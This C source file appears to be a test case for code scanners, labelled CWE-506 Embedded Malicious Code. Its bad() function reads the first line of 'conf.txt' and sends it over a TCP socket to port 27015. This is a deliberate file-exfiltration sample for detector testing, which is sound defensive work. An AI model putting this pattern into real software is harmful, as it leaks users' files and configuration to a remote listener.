/*
 * @description
 * CWE: 506 Embedded Malicious Code
 * Sinks: connect_socket
 *    BadSink : Send file contents using a connect socket (client side)
 *      BadOnly (No GoodSink)
 * Flow Variant: 01 Baseline
 */

#include "std_testcase.h"

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#pragma comment(lib, "ws2_32") /* include ws2_32.lib when linking */
#define CLOSE_SOCKET closesocket
#else /* NOT _WIN32 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define CLOSE_SOCKET close
#define SOCKET int
#endif

#define TCP_PORT 27015
#define FILENAME "conf.txt"
#define BUFFER_SIZE 65536

#ifndef OMITBAD

static void readFileContents(const char *filename, char *buffer, size_t bufferSize)
{
    FILE *pFile = NULL;

    if (buffer == NULL || bufferSize == 0)
    {
        return;
    }

    buffer[0] = '\0';
    pFile = fopen(filename, "r");
    if (pFile != NULL)
    {
        if (fgets(buffer, (int)bufferSize, pFile) == NULL)
        {
            printLine("fgets() failed");
            buffer[0] = '\0';
        }
        fclose(pFile);
    }
}

static void sendBufferOverTcp(const char *buffer)
{
#ifdef _WIN32
    WSADATA wsaData;
    int wsaDataInit = 0;
#endif
    struct sockaddr_in service;
    SOCKET connectSocket = INVALID_SOCKET;
    size_t contentLen = strlen(buffer);

    do
    {
#ifdef _WIN32
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != NO_ERROR)
        {
            break;
        }
        wsaDataInit = 1;
#endif
        connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (connectSocket == INVALID_SOCKET)
        {
            break;
        }

        memset(&service, 0, sizeof(service));
        service.sin_family = AF_INET;
        service.sin_addr.s_addr = INADDR_ANY;
        service.sin_port = htons(TCP_PORT);

        if (connect(connectSocket, (struct sockaddr *)&service, sizeof(service)) == SOCKET_ERROR)
        {
            break;
        }

        if (send(connectSocket, buffer, (int)contentLen, 0) != (int)contentLen)
        {
            break;
        }
    }
    while (0);

    if (connectSocket != INVALID_SOCKET)
    {
        CLOSE_SOCKET(connectSocket);
    }
#ifdef _WIN32
    if (wsaDataInit)
    {
        WSACleanup();
    }
#endif
}

void CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_01_bad()
{
    /* Safety fix: zero-initialize contents buffer so strlen is safe if fopen fails */
    char contents[BUFFER_SIZE] = "";

    readFileContents(FILENAME, contents, sizeof(contents));
    sendBufferOverTcp(contents);
}

#endif /* OMITBAD */

#ifdef INCLUDEMAIN

int main(int argc, char * argv[])
{
    srand((unsigned)time(NULL));
#ifndef OMITBAD
    printLine("Calling bad()...");
    CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_01_bad();
    printLine("Finished bad()");
#endif /* OMITBAD */
    return 0;
}

#endif
